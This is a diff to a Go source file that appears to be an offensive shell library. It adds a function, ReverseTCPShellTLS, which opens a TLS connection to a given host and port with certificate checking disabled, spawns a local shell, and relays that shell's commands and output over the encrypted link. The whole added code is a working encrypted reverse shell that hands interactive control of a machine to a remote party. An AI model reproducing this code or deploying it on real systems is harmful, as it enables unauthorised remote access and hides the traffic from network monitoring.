@@ -5,6 +5,7 @@ import "fmt"
 import "os"
 import "strings"
 import "net"
+import "crypto/tls"
 import "strconv"
 
 /*
@@ -156,3 +157,50 @@ func ReverseUDPShell(filepath string, host string, port int) {
 	}
 }
 
+/*
+* ReverseTCPShellTLS(filepath string, host string, port int)
+*
+* Builds on the functionality in LocalShell() to send out an interactive shell via the tls package; this one is encrypted.
+*/
+
+func ReverseTCPShellTLS(filepath string, host string, port int) {
+	//set up the socket
+	conf := &tls.Config{InsecureSkipVerify: true}
+	target_conn,err := tls.Dial("tcp4", host + ":" + strconv.Itoa(port), conf)
+	if err != nil {
+		fmt.Println("Error connecting to", host + ":" + strconv.Itoa(port))
+		fmt.Println(string(err.Error()))
+		return
+	}
+	defer target_conn.Close()
+	//spawn the shell
+	session,err := spawnShell(filepath)
+	if err != nil {
+		fmt.Println("Error initialising.")
+		fmt.Println(string(err.Error()))
+		return
+	}
+	session.launch()
+	defer session.stop()
+	//output goroutine
+	go func(session *shell) {
+		for {
+			target_conn.Write([]byte(session.recv()))
+		}
+	}(session)
+	//input
+	running := true
+	for running == true {
+		//get input
+		msg := make([]byte, 500)
+		r,_ := target_conn.Read(msg)
+		if strings.HasPrefix(string(msg), "exit") {
+			running = false
+		}
+		//now send the command
+		string_msg := fmt.Sprintf("%s", msg[0:r])
+		string_msg = strings.TrimRight(string_msg, "\r\n")
+		string_msg += "\n"
+		session.send(string_msg)
+	}
+}
